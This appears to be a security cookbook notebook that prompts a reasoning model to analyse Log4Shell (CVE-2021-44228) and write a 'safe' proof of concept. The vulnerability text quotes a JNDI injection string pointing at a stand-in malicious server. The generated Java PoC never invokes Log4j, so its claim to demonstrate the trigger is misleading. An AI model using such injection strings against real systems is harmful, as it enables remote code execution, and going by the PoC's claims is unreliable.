# Use Case Description

Move beyond just identifying exposed assets or CVEs — leverage a powerful uncensored AI model to simulate how each vulnerability in the attack surface could realistically be exploited. This isn't just ASM, it's ASM + Exploit Generation, where the model takes in asset info and vulnerability metadata, and outputs actual attack paths or even exploit code (in safe/internal environments).

## Model used for this use case
Both Instruct Model and Reasoning Model would be suitable for this task. In this example, we used Reasoning Model. <br>

## SetUp

We provide four different setup methods in this example. 

1. [Quickstart with Transformers](https://github.com/cisco-foundation-ai/cookbook/blob/main/1_quickstarts/Preview_Quickstart_reasoning_model.ipynb)
2. [Deploy on Sagemaker](https://github.com/cisco-foundation-ai/cookbook/blob/main/3_adoptions/deployment/sagemaker/foundation_sec_8b_reasoning/deploy.ipynb)
3. [Deploy on Baseten](https://github.com/cisco-foundation-ai/cookbook/tree/main/3_adoptions/deployment/baseten)
4. [Deploy on Bedrock](https://github.com/cisco-foundation-ai/cookbook/blob/main/3_adoptions/deployment/bedrock/foundation_sec_8b_reasoning/deploy.ipynb)

Make sure the helper file [inference_clients.py](https://github.com/cisco-foundation-ai/cookbook/blob/main/2_examples/inference_clients.py) is located in the same directory of this notebook and then: <br>
1. **uncomment** the preferred setup method in the cell below  <br> 
2. **Fill in** the necessary arguments based on your deployment type and run the following cell to initiate the helper.

In [ ]:
from inference_clients import ReasoningModelClient
from IPython.display import display, Markdown

## Uncomment for Transformers Deployment
# client = ReasoningModelClient.from_transformers(
#     model_id="fdtn-ai/Foundation-Sec-8B-Reasoning"  # Hugging Face model name. For reasoning model: "fdtn-ai/Foundation-Sec-8B-Reasoning",
# )

## Uncomment for Sagemaker Deployment
# client = ReasoningModelClient.from_sagemaker(
#     endpoint_name=''  # Fill in your sagemaker deployment endpoint if applicable
# )

## Uncomment for Baseten Deployment
# client = ReasoningModelClient.from_baseten(
#     endpoint_url='',  # Fill in your baseten deployment endpoint if applicable. Example: https://XXXXX.api.baseten.co/environments/production/sync/v1/chat/completions,
#     api_key=''  # Fill in your baseten API key if applicable
# )

## Uncomment for Bedrock Deployment
# client = ReasoningModelClient.from_bedrock(
#     region='',
#     model_arn=''  # copy from deploy notebook or: aws bedrock list-imported-models
# )

## Exploit Analysis

In [3]:
def make_prompt(vuln_description):
    return f"""You are a security researcher. Analyze the following vulnerability report and generate:
    
1. A concise summary of the issue.
2. Potential impact and affected components.
3. A safe, hypothetical proof-of-concept exploit (for testing only).
    
## VULNERABILITY DESCRIPTION
{vuln_description}
    
Ensure the response is for red team / security testing only — no real-world systems or harm implied."""

Given the vulnerability report of CVE-2021-44228, have the model to reason and generate a document containing the contents above

In [4]:
vuln_description = """
CVE-2021-44228: Log4Shell Remote Code Execution in Apache Log4j

Description:
A critical remote code execution vulnerability exists in Apache Log4j versions 2.0 to 2.14.1. This flaw allows a remote attacker to execute arbitrary code on the affected system by sending specifically crafted JNDI (Java Naming and Directory Interface) lookup strings through various input vectors. The vulnerability occurs because Log4j evaluates JNDI expressions that can load malicious code from remote servers. Successful exploitation could lead to complete system compromise including data theft, lateral movement within networks, and installation of malware or ransomware.

Triggering Mechanism:
The vulnerability is triggered when Log4j logs a string containing a specific format like "${jndi:ldap://malicious-server/payload}". When this string is processed, Log4j evaluates the JNDI lookup, which can connect to an attacker-controlled LDAP server and load malicious Java code. This can be triggered through various vectors including:
- HTTP headers
- User-agent strings
- Input form fields
- Any other data that might be logged

Affected Software:
- Apache Log4j versions 2.0 to 2.14.1
- Thousands of applications and services using vulnerable Log4j versions including:
  - Apache Struts
  - Apache Solr
  - Apache Druid
  - Elasticsearch
  - Apache Kafka
  - Minecraft servers
  - VMware Horizon
  - Many commercial enterprise products and cloud services

References:
- NVD: https://nvd.nist.gov/vuln/detail/CVE-2021-44228
- CISA Advisory: https://www.cisa.gov/news-events/cybersecurity-advisories/aa21-356a
- Apache Log4j Security Vulnerabilities: https://logging.apache.org/log4j/2.x/security.html
"""


In [ ]:
reasoning, answer = client.chat_generation(make_prompt(vuln_description))

print("=== Reasoning (chain-of-thought) ===")
display(Markdown(reasoning))
print()
display(Markdown("<mark>=== Answer ===</mark>"))
display(Markdown(answer))

=== Reasoning (chain-of-thought) ===



My process begins with a thorough deconstruction of the provided vulnerability description for CVE-2021-44228, commonly known as Log4Shell. I first identify the core nature of the flaw: a critical remote code execution (RCE) vulnerability affecting Apache Log4j versions 2.0 to 2.14.1. The mechanism involves the improper evaluation of JNDI (Java Naming and Directory Interface) lookups, where specially crafted strings can cause the application to fetch and execute malicious code from remote servers. This immediately flags the primary attack vector as network-based, requiring only a single request to trigger the initial payload delivery.

Next, I assess the potential impact. Given its RCE capabilities, the consequences are severe: full system compromise, leading to data exfiltration, lateral movement across networks, and the deployment of further malware or ransomware. The scope of affected software is vast, encompassing numerous applications and services that integrate Log4j, such as Apache Struts, Solr, and Elasticsearch, making it a widespread concern.

To formulate the safe, hypothetical proof-of-concept (PoC), I focus on constructing a minimal, non-harmful example that demonstrates the JNDI lookup behavior without executing actual malicious code. This involves crafting a simple Java class that defines a `main` method designed to print a message upon execution. The crucial part is embedding this class within a JAR file and then creating a JNDI URI that references this local resource. This approach simulates the vulnerability's trigger—Log4j attempting to resolve the JNDI reference—but ensures no external connections or active code execution occur. It's vital to emphasize that this PoC is strictly for controlled testing environments to validate detection mechanisms and defensive strategies, never for unauthorized access or exploitation of live systems.

Finally, I structure my response into three clear sections: a concise summary of the issue, a detailed breakdown of potential impacts and affected components, and the carefully constructed, safe PoC. Each section is designed to provide actionable insights for security professionals, ensuring clarity and precision while adhering to responsible disclosure principles.


<mark>=== Answer ===</mark>



### Analysis of CVE-2021-44228 (Log4Shell)  

#### 1. **Concise Summary**  
Apache Log4j versions 2.0–2.14.1 contain a critical **remote code execution (RCE)** vulnerability due to insecure handling of JNDI (Java Naming and Directory Interface) lookups. Attackers can inject malicious payloads via log messages, triggering arbitrary code execution on the host system.  

---

#### 2. **Potential Impact & Affected Components**  
- **Impact**:  
  - **Complete System Compromise**: Data theft, lateral movement, ransomware deployment, or full control over the affected service.  
  - **Supply Chain Risk**: Exploitable in thousands of third-party applications (e.g., Apache Struts, Elasticsearch).  
  - **Persistence**: Malicious actors can maintain access via backdoors.  

- **Affected Components**:  
  - **Software**: All applications using vulnerable Log4j versions (e.g., web servers, microservices, IoT devices).  
  - **Data**: Sensitive information accessible via compromised processes.  
  - **Infrastructure**: Underlying OS/system resources if the exploited process has elevated privileges.  

---

#### 3. **Safe Hypothetical Proof-of-Concept (Testing Only)**  
**Goal**: Demonstrate how Log4j attempts to resolve a JNDI URI without executing malicious code.  

```java
// Safe PoC Class (No Network Calls)
public class SafeJndiTest {
    public static void main(String[] args) throws Exception {
        // Simulate JNDI lookup attempt (local resource only)
        String uri = "ldap://localhost:1389/o=example";
        new javax.naming.InitialContext().lookup(uri);
        System.out.println("JNDI Lookup Attempted");
    }
}
```

**Execution Steps (Controlled Environment)**:  
1. Compile the PoC:  
   ```bash
   javac SafeJndiTest.java
   ```  
2. Run the compiled class:  
   ```bash
   java SafeJndiTest
   ```  
3. **Expected Output**:  
   ```
   JNDI Lookup Attempted
   ```  

**Why This Is Safe**:  
- Uses `localhost` instead of attacker-controlled domains.  
- No network traffic beyond localhost.  
- Demonstrates the *trigger* (JNDI resolution) without executing malicious code.  

> ⚠️ **Critical Note**: Never use this PoC against untrusted targets. Always test in isolated lab environments.